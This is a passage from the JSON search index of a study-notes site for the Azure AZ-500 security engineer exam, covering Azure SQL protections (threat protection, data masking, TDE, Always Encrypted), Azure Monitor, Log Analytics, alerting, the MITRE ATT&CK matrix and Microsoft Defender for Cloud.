accessed and managed from each SQL database resource in the Azure portal.</li> </ul> <p>SQL vulnerability assessment express and classic configurations. - You can configure vulnerability assessment for your SQL databases with either:</p> <ul> <li>Express configuration (preview) \u2013 The default procedure that lets you configure vulnerability assessment without dependency on external storage to store baseline and scan result data.</li> <li>Classic configuration \u2013 The legacy procedure that requires you to manage an Azure storage account to store baseline and scan result data.</li> </ul> <p></p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#46-sql-advanced-threat-protection","title":"4.6. SQL Advanced Threat Protection","text":"<p>Applies to: Azure SQL Database | Azure SQL Managed Instance | Azure Synapse Analytics | SQL Server on Azure Virtual Machines | Azure Arc-enabled SQL Server</p> <ul> <li>SQL Advanced Threat Protection detects anomalous activities indicating unusual and potentially harmful attempts to access or exploit databases.</li> <li>Users receive an alert upon suspicious database activities, potential vulnerabilities, and SQL injection attacks, as well as anomalous database access and queries patterns.</li> <li>Advanced Threat Protection integrates alerts with Microsoft Defender for Cloud.</li> <li>For a full investigation experience, it is recommended to enable auditing, which writes database events to an audit log in your Azure storage account.</li> <li>Click\u00a0the\u00a0Advanced Threat Protection alert\u00a0to launch the Microsoft Defender for Cloud alerts page and get an overview of active SQL threats detected on the database.</li> <li>Advanced Threat Protection is part of the Microsoft Defender for SQL offering, which is a unified package for advanced SQL security capabilities. Advanced Threat Protection can be accessed and managed via the central Microsoft Defender for SQL portal.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#47-sql-database-dynamic-data-masking-ddm","title":"4.7. SQL Database Dynamic Data Masking (DDM)","text":"<p>Dynamic data masking helps prevent unauthorized access to sensitive data by enabling customers to designate how much of the sensitive data to reveal with minimal impact on the application layer. You set up a dynamic data masking policy in the Azure portal by selecting the dynamic data masking operation in your SQL Database configuration blade or settings blade. This feature cannot be set by using portal for Azure Synapse</p> <p>Configuring DDM policy. -</p> <ul> <li>SQL users excluded from masking\u00a0- A set of SQL users or Microsoft Entra identities that get unmasked data in the SQL query results. Users with administrator privileges are always excluded from masking, and view the original data without any mask.</li> <li>Masking rules\u00a0- A set of rules that define the designated fields to be masked and the masking function that is used. The designated fields can be defined using a database schema name, table name, and column name.</li> <li>Masking functions\u00a0- A set of methods that control the exposure of data for different scenarios.</li> </ul> <p>The DDM recommendations engine, flags certain fields from your database as potentially sensitive fields, which may be good candidates for masking. In the Dynamic Data Masking blade in the portal, you can review the recommended columns for your database. All you need to do is click\u00a0Add Mask\u00a0for one or more columns and then\u00a0Save\u00a0to apply a mask for these fields.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#48-implement-transparent-data-encryption-tde","title":"4.8. Implement Transparent Data Encryption (TDE)","text":"<ul> <li>Applies to Azure SQL Database | Azure SQL Managed Instance |  Synapse SQL in Azure Synapse Analytics.</li> <li>To configure TDE through the Azure portal, you must be connected as the Azure Owner, Contributor, or SQL Security Manager.</li> <li>Encrypts data at rest. </li> <li>It performs real-time encryption and decryption of the database, associated backups, and transaction log files at rest without requiring changes to the application.</li> <li>By default, TDE is enabled for all newly deployed Azure SQL databases\u00a0and needs to be manually enabled for older databases of Azure SQL Database, Azure SQL Managed Instance, or Azure Synapse.</li> <li>It cannot be used to encrypt the logical master database because this db contains objects that TDE needs to perform the encrypt/decrypt operations. </li> <li>TDE encrypts the storage of an entire database by using a symmetric key called the Database Encryption Key (DEK).</li> <li>DEK is protected by the TDE protector. Where is this TDE protector set?:<ul> <li>At the logical SQL server level: For Azure SQL Database and Azure Synapse, the TDE protector is set at the logical SQL server level and is inherited by all databases associated with that server. </li> <li>At the instance level: For Azure SQL Managed Instance (BYOK feature in preview), the TDE protector is set at the instance level and it is inherited by all encrypted databases on that instance.</li> </ul> </li> </ul> <p>TDE protector is either a service-managed certificate (service-managed transparent data encryption) or an asymmetric key stored in Azure Key Vault (customer-managed transparent data encryption)</p> <ul> <li>The default setting for TDE is that the DEK is protected by a built-in server certificate. <ul> <li>If two databases are connected to the same server, they also share the same built-in certificate.</li> <li>The built-in server certificate is unique for each server and the encryption algorithm used is AES 256.</li> <li>Microsoft automatically rotates these certificates. Additionally, Microsoft seamlessly moves and manages the keys as needed for geo-replication and restores.</li> <li>the root key is protected by a Microsoft internal secret store. </li> </ul> </li> <li>With Customer-managed TDE or Bring Your Own Key (BYOK), \u00a0the TDE Protector that encrypts the DEK is a customer-managed asymmetric key, which is stored in a customer-owned and managed Azure Key Vault (Azure's cloud-based external key management system) and never leaves the key vault.<ul> <li>The TDE Protector can be generated by the key vault or transferred to the key vault from an on premises hardware security module (HSM) device. </li> <li>SQL Database needs to be granted permissions to the customer-owned key vault to decrypt and encrypt the DEK. </li> <li>With TDE with Azure Key Vault integration, users can control key management tasks including key rotations, key vault permissions, key backups, and enable auditing/reporting on all TDE protectors using Azure Key Vault functionality.</li> </ul> </li> </ul> <p>Turn on and off TDE from Azure portal.</p> <p>Except for Azure SQL Managed Instance, there you need to use T-SQL to turn TDE on and off on a database.</p> <p>Transact-SQL (T-SQL) is an extension of the standard SQL (Structured Query Language) used for querying and managing relational databases, particularly in the context of Microsoft SQL Server and Azure SQL Database. It is needed and used for the following reasons: 1. Procedural Capabilities: T-SQL includes procedural programming constructs such as variables, loops, and conditional statements, which are not part of standard SQL. 2. SQL Server Specific Functions: T-SQL includes functions and features that are specific to SQL Server and may not be supported by other database management systems. 3. System Management: T-SQL provides commands and procedures for managing SQL Server instances, databases, and security, which are not part of the standard SQL language. 4. Error Handling: T-SQL has error handling mechanisms like TRY...CATCH blocks, which are not part of the standard SQL syntax.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-3-data-and-applications/#49-azure-sql-always-encrypted","title":"4.9. Azure SQL Always Encrypted","text":"<p>Always Encrypted helps protect sensitive data at rest on the server, during movement between client and server, and while the data is in use. Always Encrypted ensures that sensitive data never appears as plaintext inside the database system. After you configure data encryption, only client applications or app servers that have access to the keys can access plaintext data. Always Encrypted uses the AEAD_AES_256_CBC_HMAC_SHA_256 algorithm to encrypt data in the database.</p> <p>Always Encrypted allows clients to encrypt sensitive data inside client applications and never reveal the encryption keys to the Database Engine (SQL Database or SQL Server).</p> <p>An example: Client On-Premises with Data in Azure __ A customer has an on-premises client application at their business location. The application operates on sensitive data stored in a database hosted in Azure (SQL Database or SQL Server running in a virtual machine on Microsoft Azure). The customer uses Always Encrypted and stores Always Encrypted keys in a trusted key store hosted on-premises, to ensure Microsoft cloud administrators have no access to sensitive data. Client and Data in Azure __ A customer has a client application, hosted in Microsoft Azure (for example, in a worker role or a web role), which operates on sensitive data stored in a database hosted in Azure (SQL Database or SQL Server running in a virtual machine on Microsoft Azure). Although Always Encrypted does not provide complete isolation of data from cloud administrators, as both the data and keys are exposed to cloud administrators of the platform hosting the client tier, the customer still benefits from reducing the security attack surface area (the data is always encrypted in the database).</p> <p>The Always Encrypted-enabled driver automatically encrypts and decrypts sensitive data in the client application before sending the data off to the SQL server. Always Encrypted supports two types of encryption: randomized encryption and deterministic encryption.</p> <ul> <li>Deterministic encryption\u00a0always generates the same encrypted value for any given plain text value. Using deterministic encryption allows point lookups, equality joins, grouping and indexing on encrypted columns. However, it may also allow unauthorized users to guess information about encrypted values by examining patterns in the encrypted column, especially if there is a small set of possible encrypted values, such as True/False, or North/South/East/West region. Deterministic encryption must use a column collation with a binary2 sort order for character columns.</li> <li>Randomized encryption\u00a0uses a method that encrypts data in a less predictable manner. Randomized encryption is more secure, but prevents searching, grouping, indexing, and joining on encrypted columns.</li> </ul> <p>Available is all editions of Azure SQL Database starting with SQL Server 2016.</p> <p>Deploy an always encrypted implementation. - </p> <p>The initial setup of Always Encrypted in a database involves generating Always Encrypted keys, creating key metadata, configuring encryption properties of selected database columns, and/or encrypting data that may already exist in columns that need to be encrypted.</p> <p>Some of these tasks aren't supported in Transact-SQL. You can use SQL Server Management Studio (SSMS) or PowerShell to accomplish such tasks.</p> Task SSMS PowerShell SQL Provisioning column master keys, column encryption keys and encrypted column encryption keys with their corresponding column master keys Yes Yes No Creating key metadata in the database Yes Yes Yes Creating new tables with encrypted columns Yes Yes Yes Encrypting existing data in selected database columns Yes Yes No <p>When setting up encryption for a column, you specify the information about the encryption algorithm and cryptographic keys used to protect the data in the column. Always Encrypted uses two types of keys: column encryption keys and column master keys. A column encryption key is used to encrypt data in an encrypted column. A column master key is a key-protecting key that encrypts one or more column encryption keys.</p> <p>The Database Engine stores encryption configuration for each column in database metadata. Note, however, the Database Engine never stores or uses the keys of either type in plaintext. It only stores encrypted values of column encryption keys and the information about the location of column master keys, which are stored in external trusted key stores, such as Azure Key Vault, Windows Certificate Store on a client machine, or a hardware security module.</p> <p>To access data stored in an encrypted column in plaintext, an application must use an Always Encrypted enabled client driver. When an application issues a parameterized query, the driver transparently collaborates with the Database Engine to determine which parameters target encrypted columns and, thus, should be encrypted. For each parameter that needs to be encrypted, the driver obtains the information about the encryption algorithm and the encrypted value of the column encryption key for the column, the parameter targets, as well as the location of its corresponding column master key.</p> <p>Next, the driver contacts the key store, containing the column master key, in order to decrypt the encrypted column encryption key value and then, it uses the plaintext column encryption key to encrypt the parameter. The resultant plaintext column encryption key is cached to reduce the number of round trips to the key store on subsequent uses of the same column encryption key. The driver substitutes the plaintext values of the parameters targeting encrypted columns with their encrypted values, and it sends the query to the server for processing.</p> <p>The server computes the result set, and for any encrypted columns included in the result set, the driver attaches the encryption metadata for the column, including the information about the encryption algorithm and the corresponding keys. The driver first tries to find the plaintext column encryption key in the local cache, and only makes a round to the column master key if it can't find the key in the cache. Next, the driver decrypts the results and returns plaintext values to the application.</p> <p>A client driver interacts with a key store, containing a column master key, using a column master key store provider, which is a client-side software component that encapsulates a key store containing the column master key. Providers for common types of key stores are available in client-side driver libraries from Microsoft or as standalone downloads. You can also implement your own provider. Always Encrypted capabilities, including built-in column master key store providers vary by a driver library and its version.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/","title":"IV. Security operation","text":"Sources of this notes <ul> <li>The Microsoft e-learn platform.</li> <li>Book:  \"Microsoft Certified - MCA Microsoft Certified Associate Azure Security Engineer Study Guide: Exam AZ-500. </li> <li>Udemy course:  AZ-500 Microsoft Azure Security Technologies Exam Prep.</li> <li>Udemy course: Azure Security: AZ-500 (updated July 2023)</li> </ul> Summary: AZ-500 Microsoft Azure Security Engineer Certification <ul> <li>About the certificate</li> <li>I. Manage Identity and Access</li> <li>II. Platform protection</li> <li>III. Data and applications</li> <li>IV. Security operations</li> <li>AZ-500 and more: keep learning</li> </ul> <p>Cheatsheets: Azure-CLI | Azure PowerShell </p> <p>100 questions you should pass for the AZ-500 certificate </p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#1-configure-and-manage-azure-monitor","title":"1. Configure and manage Azure Monitor","text":"","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#11-exploring-azure-monitor","title":"1.1. Exploring Azure Monitor","text":"<p>Exporting data to a SIEM</p> <p>Azure Monitor offers a consolidated pipeline for routing any of your monitoring data into a SIEM tool. This is done by streaming that data to an event hub, where it can then be pulled into a partner tool. This pipe uses the Azure Monitor single pipeline for getting access to the monitoring data from your Azure environment. Currently, the exposed security data from Microsoft Defender for Cloud to a SIEM consists of security alerts.</p> <p>Microsoft Defender for Cloud security alerts Microsoft Defender for Cloud automatically collects, analyzes, and integrates log data from your Azure resources; the network; and connected partner solutions.</p> <p>Azure Event Hubs Azure Event Hubs is a streaming platform and event ingestion service that can transform and store data by using any real-time analytics provider or batching/storage adapters. Use Event Hubs to stream log data from Azure Monitor to a Microsoft Sentinel or a partner SIEM and monitoring tools. What data can be sent into an event hub? Within your Azure environment, there are several 'tiers' of monitoring data, and the method of accessing data from each tier varies slightly.</p> <ul> <li>Application monitoring data\u00a0- Data about the performance and functionality of the code you have written and are running on Azure. Examples of application monitoring data include performance traces, application logs, and user telemetry. Application monitoring data is usually collected in one of the following ways:<ul> <li>By instrumenting your code with an SDK such as the\u00a0Application Insights SDK.</li> <li>By running a monitoring agent that listens for new application logs on the machine running your application, such as the\u00a0Windows Azure Diagnostic Agent\u00a0or\u00a0Linux Azure Diagnostic Agent.</li> </ul> </li> <li>Guest OS monitoring data\u00a0- Data about the operating system on which your application is running. Examples of guest OS monitoring data would be Linux syslog or Windows system events. To collect this type of data, you need to install an agent such as the\u00a0Windows Azure Diagnostic Agent\u00a0or\u00a0Linux Azure Diagnostic Agent.</li> <li>Azure resource monitoring data\u00a0- Data about the operation of an Azure resource. For some Azure resource types, such as virtual machines, there is a guest OS and application(s) to monitor inside of that Azure service. For other Azure resources, such as Network Security Groups, the resource monitoring data is the highest tier of data available (since there is no guest OS or application running in those resources). This data can be collected using resource diagnostic settings.</li> <li>Azure subscription monitoring data\u00a0- Data about the operation and management of an Azure subscription, as well as data about the health and operation of Azure itself. The activity log contains most subscription monitoring data, such as service health incidents and Azure Resource Manager audits. You can collect this data using a Log Profile.</li> <li>Azure tenant monitoring data\u00a0- Data about the operation of tenant-level Azure services, such as Microsoft Entra ID. The Microsoft Entra audits and sign-ins are examples of tenant monitoring data. This data can be collected using a tenant diagnostic setting.</li> </ul> <p>Some of the features of Microsoft Sentinel are:</p> <ul> <li>More than 100 built-in alert rules<ul> <li>Sentinel's alert rule wizard to create your own.</li> <li>Alerts can be triggered by a single event or based on a threshold, or by correlating different datasets or by using built-in machine learning algorithms.</li> </ul> </li> <li>Jupyter Notebooks\u00a0that use a growing collection of hunting queries, exploratory queries, and python libraries.</li> <li>Investigation graph\u00a0for visualizing and traversing the connections between entities like users, assets, applications, or URLs and related activities like logins, data transfers, or application usage to rapidly understand the scope and impact of an incident.</li> </ul> <p>To on-board Microsoft Sentinel: - Enable it - Connect your data sources with connectors that include Microsoft Threat Protection solutions,\u00a0Microsoft 365 sources, Microsoft Entra ID, Azure ATP, and\u00a0Microsoft Cloud App Security. In addition, there are built-in connectors to the broader security ecosystem for non-Microsoft solutions. You can also use common event format, Syslog or REST-API to connect your data sources with Azure Sentinel. - After you connect your data sources, choose from a gallery of expertly created dashboards that surface insights based on your data.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#12-configure-and-monitor-metrics-and-logs","title":"1.2. Configure and monitor metrics and logs","text":"<p>All data that Azure Monitor collects fits into one of two fundamental types:\u00a0metrics or logs.</p> <p>Azure Monitor Metrics. - Metrics are numerical values that are collected at regular intervals and describe some aspect of a system at a particular time. There are multiple types of metrics supported by Azure Monitor Metrics:</p> <p></p> <ul> <li>Native metrics\u00a0use tools in Azure Monitor for analysis and alerting.<ul> <li>Platform metrics are collected from Azure resources. They require no configuration and have no cost.</li> <li>Custom metrics are collected from different sources that you configure, including applications and agents running on virtual machines.</li> </ul> </li> <li>Prometheus metrics\u00a0(preview) are collected from Kubernetes clusters, including Azure Kubernetes Service (AKS), and use industry-standard tools for analyzing and alerting, such as PromQL and Grafana.</li> </ul> <p>What is Prometheus?\u00a0Prometheus is an\u00a0open-source toolkit\u00a0that\u00a0collects data\u00a0for\u00a0monitoring\u00a0and\u00a0alerting.</p> <p>Prometheus Features:</p> <ul> <li>A multi-dimensional data model with time series data identified by metric name and key/value pairs</li> <li>PromQL (PromQL component called Prom Kubernetes - an extension to support Prometheus) provides a flexible query language to use this dimensionality.</li> <li>Time series collection happens via a pull model over Hypertext Transfer Protocol (HTTP)</li> <li>Pushing time series is supported via an intermediary gateway</li> <li>Targets are discovered via service discovery or static configuration</li> </ul> <p>What is Azure Managed Grafana?</p> <p>Azure Managed Grafana is a data visualization platform built on top of the Grafana software by Grafana Labs. It's built as a fully managed Azure service operated and supported by Microsoft. Grafana helps you combine metrics, logs, and traces into a single user interface. With its extensive support for data sources and graphing capabilities, you can view and analyze your application and infrastructure telemetry data in real-time.</p> <p>Azure Managed Grafana\u00a0is optimized for the Azure environment. It works seamlessly with many Azure services. Specifically, for the current preview, it provides with the following integration features:</p> <ul> <li>Built-in support for Azure Monitor and Azure Data Explorer</li> <li>User authentication and access control using Microsoft Entra identities</li> <li>Direct import of existing charts from the Azure portal</li> </ul> <p>Why use Azure Managed Grafana?</p> <p>Managed Grafana\u00a0lets you bring together all your telemetry data into one place. It can access various data sources supported, including your data stores in Azure and elsewhere.</p> <p>As a fully managed service, Azure Managed Grafana lets you deploy Grafana without having to deal with setup. The service provides high availability, service level agreement (SLA) guarantees, and automatic software updates.</p> <p>You can share Grafana dashboards with people inside and outside your organization and allow others to join in for monitoring or troubleshooting. Managed Grafana uses\u00a0Microsoft Entra ID\u2019s centralized identity management, which allows you to control which users can use a Grafana instance, and you can use managed identities to access Azure data stores, such as Azure Monitor.</p> <p>You can create dashboards instantaneously by importing existing charts directly from the Azure portal or by using prebuilt dashboards.</p> <p>Summarizing:</p> Category Native platform metrics Native custom metrics Prometheus metrics\u00a0(preview) Sources Azure resources Azure Monitor agent  Application Insights  Representational State Transfer (REST) Application Programming Interface (API) Azure Kubernetes Service (AKS) cluster  Any Kubernetes cluster through remote-write Configuration None Varies by source Enable Azure Monitor managed service for Prometheus Stored Subscription Subscription Azure Monitor workspace Cost No Yes Yes (free during preview) Aggregation pre-aggregated pre-aggregated raw data Analyze Metrics Explorer Metrics Explorer Prometheus Querying (PromQL) LanguageGrafana dashboards Alert metrics alert rule metrics alert rule Prometheus alert rule Visualize WorkbooksAzure dashboardGrafana WorkbooksAzure dashboardGrafana Grafana Retrieve Azure Command-Line Interface (CLI) Azure PowerShell cmdletsRepresentational State Transfer (REST) Application Programming Interface (API) or client library.NETGoJavaJavaScriptPython Azure Command-Line Interface (CLI) Azure PowerShell cmdletsRepresentational State Transfer (REST) Application Programming Interface (API) or client library.NETGoJavaJavaScriptPython Grafana <p>Azure Monitor collects metrics from the following sources. After these metrics are collected in the Azure Monitor metric database, they can be evaluated together regardless of their source:</p> <ul> <li>Azure resources:\u00a0Platform metrics are created by Azure resources and give you visibility into their health and performance. Each type of resource creates a distinct set of metrics without any configuration required. Platform metrics are collected from Azure resources at a one-minute frequency unless specified otherwise in the metric's definition.</li> <li>Applications:\u00a0Application Insights creates metrics for your monitored applications to help you detect performance issues and track trends in how your application is used. Values include Server response time and Browser exceptions.</li> <li>Virtual machine agents:\u00a0Metrics are collected from the guest operating system of a virtual machine. You can enable guest operating system (OS) metrics for Windows virtual machines using the Windows diagnostic extension and Linux virtual machines by using the InfluxData Telegraf agent.</li> <li>Custom metrics:\u00a0You can define metrics in addition to the standard metrics that are automatically available. You can define custom metrics in your application that are monitored by Application Insights. You can also create custom metrics for an Azure service by using the custom metrics Application Programming Interface (API).</li> <li>Kubernetes clusters:\u00a0Kubernetes clusters typically send metric data to a local Prometheus server that you must maintain. Azure Monitor managed service for Prometheus provides a managed service that collects metrics from Kubernetes clusters and stores them in Azure Monitor Metrics.</li> </ul> <p>A common type of log entry is an event, which is collected sporadically.</p> <p>Applications can create custom logs by using the structure that they need.</p> <p>Metric data can even be stored in Logs to combine them with other monitoring data for trending and other data analysis.</p> <p>KQL (Kusto query language). - Data in Azure Monitor Logs is retrieved using a log query written with the Kusto query language, which allows you to quickly retrieve, consolidate, and analyze collected data. \u00a0Use Log Analytics to write and test log queries in the Azure portal. It allows you to work with results interactively or pin them to a dashboard to view them with other visualizations.</p> <p>Security tools use of Monitor logs:</p> <ul> <li>Microsoft Defender for Cloud\u00a0stores data that it collects in a Log Analytics workspace where it can be analyzed with other log data.</li> <li>Azure Sentinel\u00a0stores data from data sources into a Log Analytics workspace.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#13-enable-log-analytics","title":"1.3. Enable Log Analytics","text":"<p>Log Analytics is the primary tool in the Azure portal for writing log queries and interactively analyzing their results. Even if a log query is used elsewhere in Azure Monitor, you'll typically write and test the query first using Log Analytics.</p> <p>You can start Log Analytics from several places in the Azure portal. The scope of the data available to Log Analytics is determined by how you start it.</p> <ul> <li>Select Logs from the Azure Monitor menu or Log Analytics workspaces menu.</li> <li>Select Analytics from the Overview page of an Application Insights application.</li> <li>Select Logs from the menu of an Azure resource.</li> </ul> <p>In addition to interactively working with log queries and their results in Log Analytics, areas in Azure Monitor where you will use queries include the following:</p> <ul> <li>Alert rules. Alert rules proactively identify issues from data in your workspace. Each alert rule is based on a log search that is automatically run at regular intervals. The results are inspected to determine if an alert should be created.</li> <li>Dashboards. You can pin the results of any query into an Azure dashboard which allow you to visualize log and metric data together and optionally share with other Azure users.</li> <li>Views. You can create visualizations of data to be included in user dashboards with View Designer. Log queries provide the data used by tiles and visualization parts in each view.</li> <li>Export. When you import log data from Azure Monitor into Excel or Power BI, you create a log query to define the data to export.</li> <li>PowerShell. Use the results of a log query in a PowerShell script from a command line or an Azure Automation runbook that uses\u00a0<code>Invoke-AzOperationalInsightsQuery</code>.</li> <li>Azure Monitor Logs API. The Azure Monitor Logs API allows any REST API client to retrieve log data from the workspace. The API request includes a query that is run against Azure Monitor to determine the data to retrieve.</li> </ul> <p>At the center of Log Analytics is the Log Analytics workspace, which is hosted in Azure. - - Log Analytics collects data in the workspace from connected sources by configuring data sources and adding solutions to your subscription.  - Data sources and solutions each create different record types, each with its own set of properties. - You can still analyze sources and solutions together in queries to the workspace. - A Log Analytics workspace is a unique environment for Azure Monitor log data. - \u00a0Each workspace has its own data repository and configuration, and data sources and solutions are configured to store their data in a particular workspace. - \u00a0You require a Log Analytics workspace if you intend on collecting data from the following sources:     - Azure resources in your subscription     - On-premises computers monitored by System Center Operations Manager     - Device collections from Configuration Manager     - Diagnostics or log data from Azure storage</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#14-manage-connected-sources-for-log-analytics","title":"1.4. Manage connected sources for log analytics","text":"<ul> <li>The Azure Log Analytics agent was developed for comprehensive management across virtual machines in any cloud, on-premises machines, and those monitored by System Center Operations Manager.</li> <li>The Windows and Linux agents send collected data from different sources to your Log Analytics workspace in Azure Monitor, as well as any unique logs or metrics as defined in a monitoring solution.</li> <li>The Log Analytics agent also supports insights and other services in Azure Monitor such as Azure Monitor for VMs, Microsoft Defender for Cloud, and Azure Automation.</li> </ul> <p>There is something else called Azure diagnostics extension, that basically collects monitoring data from the guest operating system of Azure virtual machines.  Differences:</p> Azure Diagnostics Extension Log Analytics agent Used only with Azure virtual machines. Used with virtual machines in Azure, other clouds, and on-premises. Sends data to Azure Storage, Azure Monitor Metrics (Windows only) and Event Hubs. Sends  data to Azure Monitor Logs (to an Log Analytics Workspace). Not required specifically Required for: Azure Monitor for VMs, and other services such as Microsoft Defender for Cloud. <p>The Windows agent can be multihomed to send data to multiple workspaces and System Center Operations Manager management groups. The Linux agent can send to only a single destination. The agent for Linux and Windows isn't only for connecting to Azure Monitor, it also supports Azure Automation to host the Hybrid Runbook worker role and other services such as Change Tracking, Update Management, and Microsoft Defender for Cloud.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#15-enable-azure-monitor-alerts","title":"1.5. Enable Azure monitor Alerts","text":"<p>Azure monitor has metrics, logging, and analytics features. Another feature is Monitor Alerts.</p> <p>Alerts in Azure Monitor proactively notify you of critical conditions and potentially attempt to take corrective action. Alert rules based on metrics provide near real time alerting based on numeric values, while rules based on logs allow for complex logic across data from multiple sources.</p> <p>The unified alert experience in Azure Monitor includes alerts that were previously managed by Log Analytics and Application Insights. In the past, Azure Monitor, Application Insights, Log Analytics, and Service Health had separate alerting capabilities. Over time, Azure improved and combined both the user interface and different methods of alerting. The consolidation is still in process.</p> <p></p> <ul> <li>The alert rule captures the target and criteria for alerting. \u00a0The alert rule can be in an enabled or a disabled state. Alerts only fire when enabled.</li> <li>Target Resource: Defines the scope and signals available for alerting. A target can be any Azure resource. Example targets: a virtual machine, a storage account, a virtual machine scale set, a Log Analytics workspace, or an Application Insights resource. For certain resources (like virtual machines), you can specify multiple resources as the target of the alert rule.</li> <li>Signal: Emitted by the target resource. Signals can be of the following types: metric, activity log, Application Insights, and log.</li> <li>Criteria: A combination of signal and logic applied on a target resource. Examples:<ul> <li>Percentage CPU &gt; 70%</li> <li>Server Response Time &gt; 4 ms</li> <li>Result count of a log query &gt; 100</li> </ul> </li> <li>Alert Name: A specific name for the alert rule configured by the user.</li> <li>Alert Description: A description for the alert rule configured by the user.</li> <li>Severity: The severity of the alert after the criteria specified in the alert rule is met. Severity can range from 0 to 4.<ul> <li>Sev 0 = Critical</li> <li>Sev 1 = Error</li> <li>Sev 2 = Warning</li> <li>Sev 3 = Informational</li> <li>Sev 4 = Verbose</li> </ul> </li> <li>Action: A specific action taken when the alert is fired.</li> </ul> <p>You can alert on metrics and logs. These include but are not limited to:</p> <ul> <li>Metric values</li> <li>Log search queries</li> <li>Activity log events</li> <li>Health of the underlying Azure platform</li> <li>Tests for website availability</li> </ul> <p>With the consolidation of alerting services still in process, there are some alerting capabilities that are not yet in the new alerts system.</p> Monitor source Signal type Description Service health Activity log Not supported. View Create activity log alerts on service notifications. Application Insights Web availability tests Not supported. View Web test alerts. Available to any website that's instrumented to send data to Application Insights. Receive a notification when availability or responsiveness of a website is below expectations.","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#16-create-diagnostic-settings-in-azure-portal","title":"1.6. Create diagnostic settings in Azure portal","text":"<p>Azure Monitor diagnostic logs are logs produced by an Azure service that provide rich, frequently collected data about the operation of that service. Azure Monitor makes two types of diagnostic logs available:</p> <ul> <li>Tenant logs. These logs come from tenant-level services that exist outside an Azure subscription, such as Microsoft Entra ID.</li> <li>Resource logs. These logs come from Azure services that deploy resources within an Azure subscription, such as Network Security Groups (NSGs) or storage accounts.</li> </ul> <p></p> <p>These logs differ from the\u00a0activity log. The activity log provides insight into the operations, such as creating a VM or deleting a logic app, that Azure Resource Manager performed on resources in your subscription using. The activity log is a subscription-level log. Resource-level diagnostic logs provide insight into operations that were performed within that resource itself, such as getting a secret from a key vault.</p> <p>These logs also differ from\u00a0guest operating system (OS)\u2013level diagnostic logs. Guest OS diagnostic logs are those collected by an agent running inside a VM or other supported resource type. Resource-level diagnostic logs require no agent and capture resource-specific data from the Azure platform itself, whereas guest OS\u2013level diagnostic logs capture data from the OS and applications running on a VM.</p> <p>You can configure diagnostic settings in the Azure portal either from the Azure Monitor menu or from the menu for the resource.</p> <p>Here are some of the things you can do with diagnostic logs:</p> <p></p> <ul> <li>Save them to a storage account for auditing or manual inspection. You can specify the retention time (in days) by using resource diagnostic settings.</li> <li>Stream them to event hubs for ingestion by a third-party service or custom analytics solution, such as Power BI.</li> <li>Analyze them with Azure Monitor, such that the data is immediately written to Azure Monitor with no need to first write the data to storage.</li> <li>An event hub is created in the namespace for each log category you enable. A diagnostic log category is a type of log that a resource may collect.</li> </ul> <p>Kusto Query Language. All data is retrieved from a Log Analytics workspace using a log query written using Kusto Query Language (KQL). You can write your own queries or use solutions and insights that include log queries for an application or service.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#2-enable-and-manage-microsoft-defender-for-cloud","title":"2. Enable and manage Microsoft Defender for Cloud","text":"<p>Microsoft Defender for Cloud is your central location for setting and monitoring your organization's security posture.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#21-the-mitre-attack-matrix","title":"2.1. The MITRE Attack matrix","text":"<p>The MITRE ATT&amp;CK matrix is a\u00a0publicly accessible knowledge base\u00a0for understanding the various\u00a0tactics\u00a0and\u00a0techniques\u00a0used by attackers during a cyberattack.</p> <p>The knowledge base is organized into several categories:\u00a0pre-attack,\u00a0initial access,\u00a0execution,\u00a0persistence,\u00a0privilege escalation,\u00a0defense evasion,\u00a0credential access,\u00a0discovery,\u00a0lateral movement,\u00a0collection,\u00a0exfiltration, and\u00a0command and control.</p> <p>Tactics (T)\u00a0represent the \"why\" of an ATT&amp;CK technique or sub-technique. It is the adversary's tactical goal: the reason for performing an action.\u00a0For example, an adversary may want to achieve credential access.</p> <p>Techniques (T)\u00a0represent \"how'\" an adversary achieves a tactical goal by performing an action.\u00a0For example, an adversary may dump credentials to achieve credential access.</p> <p>Common Knowledge (CK)\u00a0in ATT&amp;CK stands for common knowledge, essentially the documented modus operandi of tactics and techniques executed by adversaries.</p> <p>Defender for Cloud\u00a0uses the MITRE Attack matrix to associate alerts with their perceived intent, helping formalize security domain knowledge.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#22-implement-microsoft-defender-for-cloud","title":"2.2. Implement Microsoft Defender for Cloud","text":"<p>Microsoft Defender for Cloud is a solution for\u00a0cloud security posture management (CSPM)\u00a0and\u00a0cloud workload protection (CWP)\u00a0that finds weak spots across your cloud configuration, helps strengthen the overall security posture of your environment, and can protect workloads across multicloud and hybrid environments from evolving threats.</p> <p>When necessary, Defender for Cloud can automatically deploy a Log Analytics agent to gather security-related data. For Azure machines, deployment is handled directly. For hybrid and multicloud environments,\u00a0Microsoft Defender plans are extended to non-Azure machines\u00a0with the help of\u00a0Azure Arc.\u00a0Cloud Security Posture Management (CSPM) features\u00a0are extended to multicloud machines without the need for any agents.</p> <p>In addition to defending your Azure environment, you can\u00a0add Defender for Cloud capabilities to your hybrid cloud environment to protect your non-Azure servers. To\u00a0extend protection\u00a0to on-premises machines,\u00a0deploy Azure Arc\u00a0and\u00a0enable Defender for Cloud's enhanced security features.</p> <p>For example, if you've connected an Amazon Web Services (AWS) account to an Azure subscription, you can enable any of these 